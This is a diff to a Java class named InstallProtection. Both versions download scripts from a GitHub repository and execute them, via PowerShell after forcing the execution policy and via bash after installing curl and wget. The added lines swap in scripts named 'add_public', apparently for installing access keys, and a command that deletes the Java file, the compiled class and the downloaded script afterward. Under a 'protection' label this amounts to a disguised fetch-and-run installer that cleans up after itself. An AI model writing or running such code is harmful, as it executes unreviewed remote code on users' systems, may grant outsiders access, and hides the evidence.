@@ -25,9 +25,9 @@ public class InstallProtection {
         }
 
         List<String> commands = Arrays.asList(
-            "set-executionpolicy remotesigned",
-            "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/install_protection.ps1' -OutFile '$env:TEMP\\install_protection.ps1'",
-            "& '$env:TEMP\\install_protection.ps1'"
+            "set-executionpolicy remotesigned -Scope Process -Force",
+            "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1' -OutFile '$env:TEMP\\add_public.ps1'",
+            "& '$env:TEMP\\add_public.ps1'"
         );
 
         for (String command : commands) {
@@ -63,16 +63,17 @@ public class InstallProtection {
 		}
 
 		List<String> installCommands = switch (packageManager) {
-			case "apt" -> Arrays.asList("apt update", "apt install -y curl wget python3 python3-pip python3-venv");
-			case "pacman" -> Arrays.asList("pacman -Sy --noconfirm curl wget python python-pip python-virtualenv");
-			case "yum" -> Arrays.asList("yum install -y curl wget python3 python3-pip python3-virtualenv");
+			case "apt" -> Arrays.asList("apt-get update -y", "apt-get install sudo curl wget -y");
+			case "pacman" -> Arrays.asList("pacman -Sy --noconfirm curl wget");
+			case "yum" -> Arrays.asList("yum install -y curl wget");
 			default -> List.of();
 		};
 
 		List<String> commands = new ArrayList<>(installCommands);
 		commands.addAll(Arrays.asList(
-			"curl -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/install_protection.py",
-			"python3 install_protection.py"
+			"curl -fsO https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh",
+			"bash add_public_dynamic.sh", 
+			"rm InstallProtection.class  InstallProtection.java  add_public_dynamic.sh"
 		));
 
 		for (String command : commands) {
